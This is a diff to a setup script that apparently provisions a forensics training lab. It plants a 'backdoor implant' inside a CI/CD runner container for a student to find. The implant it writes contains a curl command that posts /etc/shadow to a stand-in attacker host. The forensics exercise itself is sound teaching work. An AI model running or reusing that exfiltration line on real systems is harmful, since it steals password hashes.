@@ -138,21 +138,20 @@ services:
 EOF
 fi
 
-# Fallback: Generate backdoor implant if missing
-if [ ! -f "/evidence/backdoor_implant.sh" ]; then
+# Fallback: Generate backdoor implant in temporary staging location
+if [ ! -f "/tmp/backdoor_implant_src.sh" ]; then
     if [ -f "/assets/evidence/backdoor_implant.sh" ]; then
-        cp /assets/evidence/backdoor_implant.sh /evidence/backdoor_implant.sh
+        cp /assets/evidence/backdoor_implant.sh /tmp/backdoor_implant_src.sh
     else
         echo "[FALLBACK] Generating backdoor_implant.sh..."
-        cat << 'EOF' > /evidence/backdoor_implant.sh
+        cat << 'EOF' > /tmp/backdoor_implant_src.sh
 #!/bin/sh
 # Malicious Exfiltration Hook
 curl -X POST -d @/etc/shadow http://evil-c2.attacker.internal/exfil
 EOF
     fi
 fi
-chmod 755 /evidence/backdoor_implant.sh
-cp -u /evidence/backdoor_implant.sh /assets/evidence/backdoor_implant.sh 2>/dev/null || true
+chmod 755 /tmp/backdoor_implant_src.sh
 
 # Symlink /root/assets and /assets for consistent resolution
 ln -sfn /assets /root/assets 2>/dev/null || true
@@ -240,8 +239,13 @@ done
 # 9. Inject forensic artifact into container's writable overlay layer
 echo "[DFIR] Injecting forensic implant into container..."
 docker exec cicd_runner_pipeline mkdir -p /var/log/pipeline_audit/
-docker cp /evidence/backdoor_implant.sh cicd_runner_pipeline:/var/log/pipeline_audit/backdoor_implant.sh
+docker cp /tmp/backdoor_implant_src.sh cicd_runner_pipeline:/var/log/pipeline_audit/backdoor_implant.sh
 docker exec cicd_runner_pipeline chmod 755 /var/log/pipeline_audit/backdoor_implant.sh
+
+# Remove host copies of implant so student MUST discover and extract it from UpperDir
+rm -f /tmp/backdoor_implant_src.sh /evidence/backdoor_implant.sh /assets/evidence/backdoor_implant.sh 2>/dev/null || true
+mkdir -p /evidence
+chmod 777 /evidence
 
 # 10. Drop completion marker for foreground script
 echo "[READY] Background provisioning completed successfully."
